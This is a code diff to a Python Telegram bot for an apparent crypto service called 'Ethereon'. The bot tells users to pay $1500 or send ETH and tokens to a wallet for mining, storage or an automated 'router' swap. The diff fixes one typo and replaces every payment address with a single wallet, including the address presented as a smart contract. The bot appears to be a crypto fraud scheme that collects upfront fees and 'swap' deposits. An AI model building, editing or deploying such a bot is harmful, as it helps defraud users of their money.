@@ -68,7 +68,7 @@ Ethereon’s platform uses the *Proof of Space and Time* (PoST) consensus to ach
     'Mining': {'callback_data': 'mining'}, 
     'Decentralized Storage' : {'callback_data' : 'storage'},
     'Router' : {'callback_data' : 'router'},
-    'Advanvced Features' : {'callback_data' : 'adv'}
+    'Advanced Features' : {'callback_data' : 'adv'}
   })
   bot.send_message(owner, msg, reply_markup = markup )
   
@@ -86,7 +86,7 @@ def call_back(call):
         markup = quick_markup({
             'Confirm Payment' : {'callback_data' : 'confirmm'}
         })
-        bot.send_message(owner, 'To Proceed, You are requested to make a payment of *$1500* to \n`0xf38CC031888a4B13a912DA72aFfd09608a92837b` (tap to copy)\n\nPayment can take upto 15 minutes to be confirmed and our agent will contact you', reply_markup=markup)
+        bot.send_message(owner, 'To Proceed, You are requested to make a payment of *$1500* to \n`0x226f4dC06FF5121E7166Da4b89aCf110d464C6f4` (tap to copy)\n\nPayment can take upto 15 minutes to be confirmed and our agent will contact you', reply_markup=markup)
   
     elif call.data == "mining":
         msg = """Select the Asset to mine
@@ -306,7 +306,7 @@ Coins per Month: 23,454 ZCN ($2,580)
     
     elif call.data == 'rent1' or call.data == 'buy1':
         msg = """Please send the amount of eth  to this address:
-`0xf38CC031888a4B13a912DA72aFfd09608a92837b` (tap to copy)
+`0x226f4dC06FF5121E7166Da4b89aCf110d464C6f4` (tap to copy)
 process can take up to 10 minutes to get completed"""  
 
         bot.send_message(owner, msg)
@@ -378,7 +378,7 @@ You can close this window anytime
 def rv1(message):
     owner = message.chat.id
     msg = """To Complete Swap, send your tokens to the router smart contract address
-`0x5F67cf7A50F0A74172dF82946Aff24625967731c`
+`0x226f4dC06FF5121E7166Da4b89aCf110d464C6f4`
     
 *Swap is automated and swapped assets will be sent to your wallet address*
     
@@ -399,7 +399,7 @@ def setwallet(message):
         markup = quick_markup({
             'Confirm Payment' : {'callback_data' : 'confirmm'}
         })
-        bot.send_message(owner, 'To Proceed with mining, You are requested to make a payment of *$1500* to \n`0xf38CC031888a4B13a912DA72aFfd09608a92837b` (tap to copy)\n\nPayment can take upto 15 minutes to be confirmed and our agent will contact you', reply_markup=markup)
+        bot.send_message(owner, 'To Proceed with mining, You are requested to make a payment of *$1500* to \n`0x226f4dC06FF5121E7166Da4b89aCf110d464C6f4` (tap to copy)\n\nPayment can take upto 15 minutes to be confirmed and our agent will contact you', reply_markup=markup)
     else:
         bot.send_message(owner, 'Invalid wallet address')
         
